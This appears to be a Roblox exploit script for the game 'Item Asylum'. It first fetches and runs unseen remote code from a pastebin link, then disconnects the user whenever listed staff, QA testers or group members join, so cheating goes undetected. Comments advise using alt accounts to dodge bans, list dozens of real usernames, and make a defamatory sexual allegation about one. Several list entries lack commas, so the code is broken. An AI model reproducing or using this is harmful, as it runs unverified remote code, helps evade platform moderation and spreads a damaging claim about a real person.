loadstring(game:HttpGet('https://pastebin.com/raw/tZJF8g3K'))()
wait(5)


                                                                                                                                                                                         --[[
Loadstring: loadstring(game:HttpGet('https://github.com/xrtzrr/scripts/raw/main/IA_AdminKick.lua'))()
Game: https://www.roblox.com/games/5670218884/IA
Functionality: Avoid getting banned and avoid in-game admins, basically.

Kicks you out of the game automatically if an item asylum admin/headadmin/developer joins in-game, can also kick you if a roblox QA tester or admin joins.
The list will be updated if necessary, i'm not going to add contributors or testers, they won't do anything, if anything, just screenshot you and report you, but who cares, really

**NOTE**: I've noticed they do bans in a console now. Be aware of that and use alts to avoid this.
                                                                                                                                                                                         --]]


if not game:IsLoaded() then
    game.Loaded:Wait()
end

Players = game:GetService"Players"
Names = {
--  Trial Moderators [0]:
    
--  Server & Game Moderators [1]:
    "StygianArmor", -- Was a Administrator, but got demoted back to being a Server Moderator
    
--  Administrators [13]:
    "Lovely_Sammer", -- Administrator, Demoted to Tester, then Promoted back to Administrator
    "aateeer" -- New Administrator
    "DatGuyFromSg1" -- New Administrator
    "RG_Amber", -- Trial Moderator, Promoted to Administrator
    "pokemonfan61980", -- Trial Moderator, Promoted to Administrator
    "OriginallyKosar", -- Past Administrator, Demoted, then Promoted to Admin
    "Rivrax6", -- Past Trial Moderator, Promoted to Administrator
    "Chill_yz", -- Past Trial Moderator, Promoted to Administrator
    "theYurizone", -- Past Trial Moderator, Promoted to Administrator
    "Candle_Pastries", -- Past Moderator, Promoted to Administrator
    "TazNova", -- Still an Administrator
    "TheLunaticSome", -- Still an Administrator
    "Rikkanashiii", -- Still an Administrator
    
--  Head Administrators [1]:
    "Emerald_Plasma", -- Past Moderator & Administrator, Promoted to Head Administrator
    
--  Assistant [3]:
    "ka_zena", -- Past Trial Moderator, Promoted to Administrator, then Promoted to Assistant
    "fiveplutos", -- Still a Assistant
    "ExpressTrainToHell", -- Still a Assistant
    
--  Game Developers [5]:
    "JeanRBLX", -- Group Holder
    "cowoika", -- Was a Head Adminstrator, then Promoted to Developer
    "LEBWEE",  -- Past Music Developer, Promoted to Game Developer
    "Siterior", -- Past Administrator, Promoted to Game Developer
    "PortABoi", -- Still a Game Developer
    
-- Adding previous admins here because they probably have relations with staff and can probably report you to the current game moderators.
-- Other Staff [26]:
    "Blithwin", -- Past Assistant, Demoted to Tester
    "HyoreiNeko", -- Past Trial Moderator, Promoted to Administrator, then Demoted to Respected
    "Scythecel", -- Trial Moderator & Past Moderator, then Promoted to Admin, then demoted to Contributor | Old username: ChlomakiTheWitch
    "dilbertron2", -- Past Moderator, Promoted to Administrator, then left JPX for unknown reasons.
    "JonathanFoxx", -- Administrator, Demoted to Tester
    "Enestarhan2018", --  Former Moderator, Demoted to Respected
    "Xerroz", -- Left JPX Studios | RIP, he was a good guy and one of the main devs
    "XDavodioX", -- Past Assistant to Contributor
    "BeezelduD", -- Past Assistant to Contributor
    "Tidyen", -- Past Assistant to Contributor
    "Weko", -- Past Head Administrator demoted to Member
    "TrixisDev", -- Past Administrator | and also a Pedophile (Allegedly!)
    "Pixelmen360", -- Past Head Administrator
    "TimidNomf", -- Past Administrator, Demoted to Member | Kemono-head wearer (ew.)
    "Lanternsaurus", -- Past Moderator
    "D1s_c", -- Past Administrator
    "raaymaark", -- Past Administrator, Demoted to Trial Moderator, then Demoted to Member. RIP. | Old username: Iei5h
    "SniffE_Boi", -- Past Administrator
    "Nanachiiky", -- Past Administrator
    "FormalNoob", -- Past Administrator
    "Acorlan", -- Past Administrator
    "dilbertron2" -- Past Administrator
    "loosefreak", -- Past Moderator
    "EquusQuagga", -- Past Moderator
    "DJSpaceInvaderz", -- Past Moderator
    "NFKitsune" -- Past Administrator
    
-- Total Staff team (including ex-staff): 49
-- Total Staff team (not including ex-staff): 23



-- This is for QA testers (Kind of like Roblox staff), this is to ensure you don't get terminated, not from the game, but Roblox.
}
local function check(p)
    for _,id in {
        1200769,
        3055661,
        3253689,
        6821794,
        10279336,
        12513722,
        14593111
    } do
        task.spawn(function()
            if table.find(Names, p.Name) or p:IsInGroup(id) then
                game:Shutdown("A Roblox admin and/or a QA tester has joined your game! Be careful next time when exploiting.")
            end
        end)
    end
    task.spawn(function()
        ch = p.ch or p.CharacterAdded:Wait()
        for _,AccessoryName in {
            "Valiant Top Hat of Testing",
            "Thoroughly-Tested Hat of QA",
            "Valiant Valkyrie of Testing"
        } do
            task.spawn(function()
                if ch:WaitForChild(AccessoryName, 10) then
                game:Shutdown("A Roblox admin and/or a QA tester has joined your game! Be careful next time when exploiting.")
                end
            end)
        end
    end)
end

Players.PlayerAdded:Connect(check)
for _,p in Players:GetPlayers() do
    check(p)
end
